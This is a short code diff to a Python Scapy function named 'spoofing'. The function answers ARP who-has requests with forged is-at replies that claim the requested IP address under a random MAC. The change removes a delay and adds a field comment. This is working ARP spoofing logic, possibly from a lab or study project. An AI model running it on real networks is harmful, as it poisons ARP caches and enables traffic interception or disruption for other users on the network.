@@ -33,8 +33,9 @@ def spoofing(pkt):
     
     elif pkt.haslayer(ARP) and pkt[ARP].op == ARP_WHO_HAS:
         
-        time.sleep(1)
+        # time.sleep(1)
 
+        # plen = 4 -> IpV4, hwlen = 6 -> No. of bytes in MAC address, op = ARP_IS_AT (n = 2) -> ARP reply
         arp = ARP(op = ARP_IS_AT, plen = 4, hwlen = 6, hwsrc = random_mac(), hwdst = pkt[ARP].hwsrc, psrc = pkt[ARP].pdst, pdst = pkt[ARP].psrc)
         print(f"ARP request from {pkt[ARP].psrc} to {pkt[ARP].pdst}\nSending reply")
 
